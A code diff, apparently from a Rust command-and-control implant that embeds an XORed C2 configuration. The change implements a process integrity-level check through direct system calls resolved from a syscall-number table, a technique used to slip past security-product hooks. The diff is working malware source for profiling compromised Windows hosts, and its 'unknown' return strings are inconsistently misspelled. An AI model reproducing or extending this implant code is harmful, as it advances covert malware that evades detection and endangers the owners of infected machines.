@@ -1,8 +1,9 @@
-use crate::core::net::json::JsonWriter;
+use core::ffi::c_void;
 
+use crate::core::net::json::JsonWriter;
 use crate::core::net::transport::HttpSession;
 use crate::debug;
-use crate::core::ssn_table;
+use crate::core::{invoke, ssn_table};
 
 // Build time C2 config (XORed and embedded by build.rs)
 pub struct C2Config<'a> {
@@ -113,7 +114,71 @@ unsafe fn get_process_name_from_peb() -> String {
  * Query the current process integrity level
  * */
 unsafe fn query_integrity_level() ->  &'static str {
-    unimplemented!()
+    let table = ssn_table::syscall_table();
+    if table.ssns.nt_open_process_token.ssn == 0 || table.ssns.nt_query_information_token.ssn == 0 {
+        return "unknown";
+    }
+
+    // Open current process token
+    let mut token_handle: *mut c_void = core::ptr::null_mut();
+    let current_process = -1isize as *mut c_void;
+    let status = invoke::syscall3(
+        table.ssns.nt_open_process_token.ssn,
+        table.ssns.nt_open_process_token.syscall_addr as usize,
+        current_process as usize,
+        0x008, // TOKEN_QUERY
+        &mut token_handle as *mut _ as usize
+    );
+
+    if status != 0 || token_handle.is_null() {
+        return "unkown";
+    }
+
+    // Query TokenIntegrityLevel 
+    let mut buf = [0u8; 64];
+    let status = invoke::syscall4(
+        table.ssns.nt_query_information_token.ssn,
+        table.ssns.nt_query_information_token.syscall_addr as usize,
+        token_handle as usize,
+        25, // TokenIntegrityLevel
+        buf.as_mut_ptr() as usize,
+        64,
+    );
+
+    // close token handle
+    invoke::syscall1(
+        table.ssns.nt_close.ssn, 
+        table.ssns.nt_close.syscall_addr as usize,
+        token_handle as usize
+    );
+
+    if status != 0 {
+        return "unkown";
+    }
+
+    // TOEKEN_MANDATORY_LABLE: fist 8 byte are SID pointer then attributes
+    // the SID last sub authority contains the integrity RID
+    let sid_ptr = *(buf.as_ptr() as *const *const u8);
+    if sid_ptr.is_null() {
+        return "unkown";
+    }
+
+    // SID structure: revision(1) + sub_auth_count(1) + authority(6) + sub_authorities(4*N)
+    let sub_auth_count = *sid_ptr.add(1) as usize;
+    if sub_auth_count == 0 {
+        return "unkwon"
+    }
+    // Last sub authority is at offset 8 + (sub_auth_count - 1) * 4
+    let rid_offset = 8 + (sub_auth_count - 1) * 4;
+    let rid = *(sid_ptr.add(rid_offset) as *const u32);
+
+    match rid {
+        0x0000..=0x0FFF => "untrusted",
+        0x1000..=0x1FFF => "low",
+        0x2000..=0x2FFF => "medium",
+        0x3000..=0x3FFF => "high",
+        0x4000.. => "system",
+    }
 }
 
 /**
